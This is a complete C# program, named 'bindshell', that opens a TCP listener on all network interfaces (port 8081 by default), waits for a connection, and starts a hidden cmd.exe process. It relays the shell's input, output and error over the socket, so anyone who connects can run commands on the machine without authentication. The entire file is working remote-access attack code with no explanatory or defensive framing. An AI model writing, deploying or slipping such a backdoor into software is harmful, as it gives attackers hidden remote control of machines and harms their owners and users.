using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
namespace bindshell
{
    public static class SocketService
    {

        private static string GetString(this byte[] byts, int nBytes)
        {
            return Encoding.ASCII.GetString(byts, 0, nBytes);
        }
        public static string GetValueOfParameterStr(this string[] parm, string Par_Name)
        {
            Match rMatch;
            foreach (string par in parm)
            {
                rMatch = Regex.Match(par, @"^" + Par_Name + @"=?\s*(.+)");
                if (rMatch.Success) return rMatch.Groups[1].Value;
            }
            return "";
        }
        public static int ConvertToInt(this string intstr, int fail_return = 0)
        {
            Match Numbers = Regex.Match(intstr, @"^([0-9]*)");
            if(Numbers.Success) return Convert.ToInt32(Numbers.Groups[1]);
            return fail_return;
        }
        public static Task CreateOutputTask(this StreamReader Input, StreamWriter nStream, CancellationToken ctoken)
        {
            Task tOutput = new Task(new Action(() =>
            {
                Stream st = Input.BaseStream;
                StreamWriter sw = nStream;
                byte[] buff = new byte[64];
                int rSize;
                while (!ctoken.IsCancellationRequested)
                {
                    try
                    {
                        rSize = 0;
                        rSize = st.Read(buff, 0, buff.Length);                        
                        sw.Write(buff.GetString(rSize));
                        sw.Flush();
                    }
                    catch (Exception) { }
                }
            }));
            return tOutput;
        }
        public static Task CreateInputTask(this StreamWriter Output, NetworkStream nStream, CancellationToken ctoken)
        {
            Task tInput = new Task(new Action(() =>
            {
                StreamReader sr = new StreamReader(nStream);
                while (!ctoken.IsCancellationRequested)
                {
                    try
                    {
                        Output.WriteLine(sr.ReadLine());
                    }
                    catch (Exception) { }
                }
            }));
            return tInput;
        }
        public static void StartAllTask(params Task[] prm)
        {
            foreach(Task tsk in prm)
            {
                tsk.Start();
            }
        }
    }
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>

        [STAThread]
        static void Main(string[] args)
        {
            Socket Listener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            Socket client;
            CancellationTokenSource CTokenSrc;
            Process Shell;

            Shell = new Process();
            Shell.StartInfo = new ProcessStartInfo()
            {
                UseShellExecute = false,
                CreateNoWindow = true,
                FileName = "cmd",
                RedirectStandardError = true,
                RedirectStandardInput = true,
                RedirectStandardOutput = true
            };

            CTokenSrc = new CancellationTokenSource();

            Task tErr, tOut, tIn;

            Listener.Bind(new IPEndPoint(IPAddress.Any, args.GetValueOfParameterStr("--port").ConvertToInt(8081)));
            Listener.Listen(10);
                        
            client = Listener.Accept();

            Shell.Start();
            using (NetworkStream ns = new NetworkStream(client))
            {
                using (StreamWriter ws = new StreamWriter(ns))
                {
                    tOut = Shell.StandardOutput.CreateOutputTask(ws, CTokenSrc.Token);
                    tErr = Shell.StandardError.CreateOutputTask(ws, CTokenSrc.Token);
                    tIn = Shell.StandardInput.CreateInputTask(ns, CTokenSrc.Token);

                    SocketService.StartAllTask(tErr, tOut, tIn);

                    while (!client.Poll(5000, SelectMode.SelectRead))
                    {
                        if (Shell.HasExited) break;
                    }

                    CTokenSrc.Cancel();
                    if (!Shell.HasExited) Shell.Kill();
                    Task.WaitAll(tErr, tOut, tIn);
                }
            }
            client.Close();
            Listener.Close();
        }        
        
    }
}
